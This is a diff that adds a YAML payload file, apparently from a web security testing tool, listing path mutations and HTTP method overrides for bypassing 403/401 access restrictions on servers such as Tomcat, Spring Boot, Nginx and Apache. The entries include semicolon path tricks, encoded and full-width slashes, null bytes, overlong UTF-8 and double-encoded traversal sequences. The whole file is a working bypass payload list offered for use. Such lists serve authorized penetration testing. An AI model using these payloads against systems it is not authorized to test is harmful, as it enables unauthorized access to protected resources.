@@ -1,0 +1,35 @@
+# payloads/403_bypass.yml
+# Advanced Path mutations, normalization exploits, and method overrides for 403/401 bypass
+
+path_mutations:
+  # Tomcat / Java specific
+  - "{path}..;/"
+  - "{path};/"
+  - "/;/{path}"
+  - "{path}/;"
+  # Spring Boot specific
+  - "/%2e/{path}"
+  - "/%ef%bc%8f{path}" # Full-width slash
+  # Nginx / Apache specifics
+  - "/./{path}/./"
+  - "//{path}//"
+  - "{path}/."
+  - "{path}%20"
+  - "{path}%09"
+  - "{path}%00"
+  - "{path}#"
+  - "{path}?"
+  - "{path}..%252f"
+  - "{path}..%c0%af"
+  - "{path}.html"
+  - "{path}.json"
+
+methods:
+  - "GET"
+  - "POST"
+  - "TRACE"
+  - "OPTIONS"
+  - "PUT"
+  - "PATCH"
+  - "INVENTED"
+  - "HEAD"
